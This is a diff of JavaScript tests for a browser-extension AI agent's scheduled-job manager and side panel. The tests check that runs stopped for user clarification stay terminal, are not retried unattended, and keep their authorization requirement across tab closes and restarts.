+      h.updates.some((u) => u.type === 'scheduled_job' && u.data?.event === 'completed'),
+      false,
+      `${label}: clarification-required run must not emit completion`,
+    );
+    assert.ok(
+      h.updates.some((u) => u.type === 'scheduled_job' && u.data?.event === 'clarification_required'),
+      `${label}: clarification-required run should emit a distinct terminal update`,
+    );
+
+    const terminalSnapshot = JSON.parse(JSON.stringify(h.jobs()));
+    for (const actionName of ['cancelJob', 'pauseJob', 'deleteJob']) {
+      let abortedTabId = null;
+      const actionHarness = makeSchedulerHarness(SchedulerMod, {
+        now,
+        jobs: JSON.parse(JSON.stringify(terminalSnapshot)),
+        abort: (tabId) => { abortedTabId = tabId; },
+      });
+      let actionResult;
+      if (actionName === 'cancelJob') {
+        actionResult = await actionHarness.manager.cancelJob(created.jobId, 'cancel terminal stop');
+      } else if (actionName === 'pauseJob') {
+        actionResult = await actionHarness.manager.pauseJob(created.jobId);
+      } else {
+        actionResult = await actionHarness.manager.deleteJob(created.jobId);
+      }
+      assert.equal(actionResult.ok, true, `${label}: ${actionName} should update a terminal clarification job`);
+      assert.equal(
+        abortedTabId,
+        null,
+        `${label}: ${actionName} must not abort an unrelated live run for a terminal clarification job`,
+      );
+    }
+
+    const restarted = makeSchedulerHarness(SchedulerMod, {
+      now: now + SchedulerMod.QUEUE_RETRY_MS,
+      jobs: h.jobs(),
+    });
+    await restarted.manager.restoreAlarms();
+    const restoredJob = restarted.jobs()[0];
+    assert.equal(restoredJob.status, 'needs_user_input', `${label}: restart must not queue a terminal authorization stop`);
+    assert.equal(restoredJob.clarificationRequired, true, `${label}: restart should preserve the terminal clarification marker`);
+    assert.equal(restarted.alarms.has(restarted.alarmName(created.jobId)), false, `${label}: restart must not arm an unattended retry`);
+
+    const runNow = await restarted.manager.runNow(created.jobId);
+    assert.equal(runNow.ok, true, `${label}: an explicit Run now should restart a terminal clarification stop`);
+    assert.equal(restarted.jobs()[0].status, 'pending', `${label}: explicit retry should return the job to pending`);
+    assert.equal(restarted.jobs()[0].clarificationRequired, false, `${label}: explicit retry should clear the scheduler terminal marker`);
+    assert.equal(
+      restarted.alarms.get(restarted.alarmName(created.jobId))?.when,
+      now + SchedulerMod.QUEUE_RETRY_MS + 1000,
+      `${label}: explicit retry should arm an immediate alarm`,
+    );
+  }
+});
+
+test('sidepanel settles terminal scheduled clarification events and renders their result', () => {
+  for (const [label, rel] of [
+    ['chrome', 'src/chrome/src/ui/sidepanel.js'],
+    ['firefox', 'src/firefox/src/ui/sidepanel.js'],
+  ]) {
+    const panel = fs.readFileSync(path.join(ROOT, rel), 'utf8');
+    const settleStart = panel.search(/async function settleScheduledRun\(event, job, tabId = currentTabId\)/);
+    const handlerStart = panel.search(/(?:async\s+)?function handleScheduledJobEvent\(data, tabId\)/);
+    const handlerEnd = panel.indexOf('if (scheduledJobsEl)', handlerStart);
+    assert.notEqual(settleStart, -1, `${label}: scheduled settlement helper missing`);
+    assert.notEqual(handlerStart, -1, `${label}: scheduled event handler missing`);
+    assert.notEqual(handlerEnd, -1, `${label}: scheduled event handler boundary missing`);
+    const settleBody = panel.slice(settleStart, handlerStart);
+    const handlerBody = panel.slice(handlerStart, handlerEnd);
+    assert.match(
+      settleBody,
+      /\['completed', 'clarification_required'\]\.includes\(event\)[\s\S]*?job\?\.lastResult[\s\S]*?formatMarkdown\(job\.lastResult\)/,
+      `${label}: terminal clarification result should render before settlement`,
+    );
+    assert.match(
+      handlerBody,
+      /\['completed', 'failed', 'clarification_required'\]\.includes\(event\)/,
+      `${label}: terminal clarification should route across panels like other terminal events`,
+    );
+    assert.match(
+      handlerBody,
+      /event === 'clarification_required'[\s\S]*?ensureScheduledTerminalMessage\(job\);[\s\S]*?settleScheduledRun\(event, job, runTabId\)/,
+      `${label}: terminal clarification should settle the spinner and scheduled assistant message`,
+    );
+  }
+});
+
 test('ScheduledJobManager aborts live clarification waits when pausing jobs', async () => {
   const now = Date.UTC(2026, 0, 1, 12, 0, 0);
   for (const [label, SchedulerMod] of [['chrome', SchedulerCh], ['firefox', SchedulerFx]]) {
@@ -17336,6 +18137,69 @@ test('ScheduledJobManager preserves URL-target schedules when helper tabs close'
     assert.equal(runCount, 2, `${label}: schedule should run again in a fresh helper tab`);
     assert.notEqual(job.target.tabId, helperTabId, `${label}: fresh helper tab should be recorded`);
     assert.equal(h.tabs.get(job.target.tabId).url, targetUrl, `${label}: fresh helper tab should use target URL`);
+  }
+});
+
+test('ScheduledJobManager keeps terminal URL authorization stops durable when helper tabs close', async () => {
+  const now = Date.UTC(2026, 0, 1, 12, 0, 0);
+  for (const [label, SchedulerMod] of [['chrome', SchedulerCh], ['firefox', SchedulerFx]]) {
+    let abortCalls = 0;
+    const authorizationGuardTabs = [];
+    const stoppedMessage = '[Scheduled run stopped for explicit clarification.]';
+    const h = makeSchedulerHarness(SchedulerMod, {
+      now,
+      abort: () => { abortCalls += 1; },
+      requireExplicitClarificationAuthorization: async (tabId) => { authorizationGuardTabs.push(tabId); },
+      processMessage: async (_tabId, _message, onUpdate) => {
+        onUpdate('run_status', { status: 'clarification_required', message: stoppedMessage });
+        return stoppedMessage;
+      },
+    });
+    const created = await h.manager.createTaskJob({
+      args: {
+        title: 'Review inbox',
+        prompt: 'Review the inbox after clarification.',
+        schedule: { type: 'once', after_seconds: 60 },
+        target: { type: 'url', url: 'https://example.com/inbox' },
+      },
+      source: 'user',
+    });
+
+    await h.manager.handleAlarm(h.alarmName(created.jobId));
+    let job = h.jobs()[0];
+    const helperTabId = job.target.tabId;
+    assert.equal(job.status, 'needs_user_input', `${label}: URL run should stop for clarification`);
+    assert.equal(job.clarificationRequired, true, `${label}: URL run should persist the terminal marker`);
+    assert.equal(job.clarificationAuthorizationRequired, true, `${label}: URL run should persist the structural authorization requirement`);
+
+    // Browser alarms are one-shot; mirror their removal before simulating the
+    // helper tab closing after the terminal run has already returned.
+    h.alarms.delete(h.alarmName(created.jobId));
+    h.tabs.delete(helperTabId);
+    await h.manager.cancelForTab(helperTabId, 'tab closed');
+
+    job = h.jobs()[0];
+    assert.equal(job.status, 'needs_user_input', `${label}: helper-tab close must not queue the terminal stop`);
+    assert.equal(job.clarificationRequired, true, `${label}: helper-tab close should preserve the terminal marker`);
+    assert.equal(job.clarificationAuthorizationRequired, true, `${label}: helper-tab close should preserve the structural authorization requirement`);
+    assert.equal(job.tabId, null, `${label}: helper-tab close should drop the stale top-level tab id`);
+    assert.equal(job.target.tabId, null, `${label}: helper-tab close should drop the stale target tab id`);
+    assert.equal(h.alarms.has(h.alarmName(created.jobId)), false, `${label}: helper-tab close must not arm a retry`);
+    assert.equal(abortCalls, 0, `${label}: helper-tab close must not abort an already-terminal run`);
+
+    const retried = await h.manager.runNow(created.jobId);
+    assert.equal(retried.ok, true, `${label}: explicit Run now should restart the terminal job`);
+    job = h.jobs()[0];
+    assert.equal(job.status, 'pending', `${label}: explicit retry should return the terminal job to pending`);
+    assert.equal(job.clarificationRequired, false, `${label}: explicit retry should clear the UI terminal marker`);
+    assert.equal(job.clarificationAuthorizationRequired, true, `${label}: explicit retry must carry the structural authorization requirement`);
+
+    await h.manager.handleAlarm(h.alarmName(created.jobId));
+    job = h.jobs()[0];
+    const replacementTabId = job.target.tabId;
+    assert.notEqual(replacementTabId, helperTabId, `${label}: explicit retry should resolve a fresh helper tab`);
+    assert.deepEqual(authorizationGuardTabs, [replacementTabId], `${label}: fresh helper tab did not reinstall the timeout-derived guard before execution`);
+    assert.equal(job.clarificationAuthorizationRequired, true, `${label}: repeated terminal stop should keep the structural authorization requirement`);
   }
 });
 
@@ -31801,6 +32665,7 @@ function configurePlanOnlyGuardAgent(agent, tabId) {
   agent._maybeReinjectAdapter = async () => {};
   agent._ensureProgressSessionForCurrentTask = async () => ({ mode: 'inactive' });
   agent._persist = () => {};
+  agent._persistNow = async () => true;
   agent.conversationModes.set(tabId, 'act');
   agent.conversations.set(tabId, [{ role: 'system', content: 'sys' }]);
   agent.executeTool = async (_toolTabId, name, args) => {
@@ -41088,6 +41953,53 @@ test('per-tab run UI protocol is wired into both backgrounds and side panels', (
     assert.match(panel, /card\.dataset\.runRequestId/, `${label}: plan cards should store their request identity`);
     assert.match(panel, /else if \(event === 'running'\) \{[\s\S]*?setTabProcessing\(runTabId, true\);[\s\S]*?setTabAbortRequested\(runTabId, false\);/, `${label}: scheduled runs should participate in tab-scoped stop state`);
     assert.match(panel, /const switchGeneration = \+\+tabSwitchGeneration;[\s\S]*?if \(switchGeneration !== tabSwitchGeneration\) return;/, `${label}: overlapping tab switches should cancel stale async transitions`);
+  }
+});
+
+test('clarification-required runs stay terminal and unsuccessful across chat paths', () => {
+  for (const [label, bgRel, reconnectRel, panelRel] of [
+    ['chrome', 'src/chrome/src/background.js', 'src/chrome/src/run-reconnect.js', 'src/chrome/src/ui/sidepanel.js'],
+    ['firefox', 'src/firefox/src/background.js', 'src/firefox/src/run-reconnect.js', 'src/firefox/src/ui/sidepanel.js'],
+  ]) {
+    const background = fs.readFileSync(path.join(ROOT, bgRel), 'utf8');
+    const reconnect = fs.readFileSync(path.join(ROOT, reconnectRel), 'utf8');
+    const panel = fs.readFileSync(path.join(ROOT, panelRel), 'utf8');
+
+    assert.match(
+      background,
+      /function isClarificationRequiredRunUpdate\(update\)[\s\S]*update\?\.type === 'run_status'[\s\S]*update\?\.data\?\.status === 'clarification_required'/,
+      `${label}: structured clarification-required status should be recognized`,
+    );
+    assert.match(
+      background,
+      /if \(updates\.some\(isClarificationRequiredRunUpdate\)\) return 'clarification_required';/,
+      `${label}: clarification-required should be persisted as its own terminal run status`,
+    );
+    assert.equal(
+      (background.match(/succeeded: runUpdatesSucceeded\(updates\)/g) || []).length,
+      3,
+      `${label}: normal, streamed, and continued turns should all mark clarification-required memory input unsuccessful`,
+    );
+    assert.equal(
+      (background.match(/terminalRunUiStatus\(result, updates, runError\)/g) || []).length,
+      3,
+      `${label}: normal, streamed, and continued finalizers should all consume structured run status`,
+    );
+    assert.equal(
+      (background.match(/updates\.push\(\{ type, data \}\);/g) || []).length,
+      3,
+      `${label}: every chat path should retain run-status updates through finalization`,
+    );
+    assert.match(
+      reconnect,
+      /TERMINAL_RUN_STATUSES = new Set\(\[[^\]]*'clarification_required'[^\]]*\]\)/,
+      `${label}: reconnect should not resume a clarification-required terminal snapshot`,
+    );
+    assert.match(
+      panel,
+      /function isTerminalRunUiStatus\(status\)[\s\S]*'clarification_required'/,
+      `${label}: restored UI should treat clarification-required as terminal`,
+    );
   }
 });
 
